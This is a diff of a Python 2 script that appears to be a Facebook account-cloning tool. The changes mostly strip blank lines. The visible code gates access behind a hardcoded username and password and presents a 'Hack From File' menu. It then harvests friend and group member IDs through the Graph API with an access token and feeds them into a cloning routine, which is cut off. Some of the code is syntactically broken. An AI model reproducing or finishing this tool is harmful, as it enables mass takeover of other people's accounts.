@@ -1,6 +1,5 @@
 ﻿#!/usr/bin/python2
 #coding=utf-8
-
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
@@ -57,7 +56,6 @@ id = []
 listgrup = []
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
-
 os.system("clear")
 print "\x1b[0;31m⚔═══════════════════════════☠═══════════════════════════⚔"
 print  """\033[91mNote[Ema Bar Prs Nen La Hech Keshayak
@@ -66,7 +64,6 @@ print  """\033[91mNote[Ema Bar Prs Nen La Hech Keshayak
 print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"
 CorrectUsername = "BLND"
 CorrectPassword = "MASUD"
-
 loop = 'true'
 while (loop == 'true'):
     username = raw_input("\033[1;96m[☆] \x1b[0;31mUSERNAME TOOLAKA Bnusa\x1b[1;96m>>>> ")
@@ -137,8 +134,6 @@ def login():
 			os.system('rm -rf login.txt')
 			time.sleep(1)
 			login()
-
-
 def menu():
 	os.system('clear')
 	try:
@@ -177,7 +172,6 @@ def menu():
 	print "\033[91m[2] \033[33mm══Update Tool"																														
 	print "\033[91m[0] \033[033m══Log out"
 	pilih()
-
 def pilih():
 	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
 	if unikers =="":
@@ -217,7 +211,6 @@ def super():
 	print "\033[33m[4] \033[91m══Hack From File"
 	print "\033[33m[0] \033[91m══Back"
 	pilih_super()
-
 def pilih_super():
 	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
 	if peak =="":
@@ -226,13 +219,11 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-
 		jalan('\033[1;93m[✺] Henani Id Kan \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
 			id.append(s['id'])
-
 	elif peak =="2":
 		os.system('clear')
 		print logo
@@ -250,7 +241,6 @@ def pilih_super():
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id']
-
 	        elif peak =="3":
 		os.system('clear')
 		print logo                  
@@ -267,7 +257,6 @@ def pilih_super():
 	else:
 		print "\x1b[1;91mFill in correctly"
 		pilih_super()
-
 	
 	print "\033[1;36;40m[✺] Total IDs : \033[1;94m"+str(len(id))
 	jalan('\033[1;34;40m[✺] Please Wait...')
@@ -278,7 +267,6 @@ def pilih_super():
 	print "   \033[1;31;48m__SHEX__BLND__UP"
 	jalan('                    \033[1;91mTricker start cloning Wait...')
 	print  "  \033[1;36;48m__SHEX__BLND__UP "
-
 	def main(arg):
 		global cekpoint,oks
 		user = arg
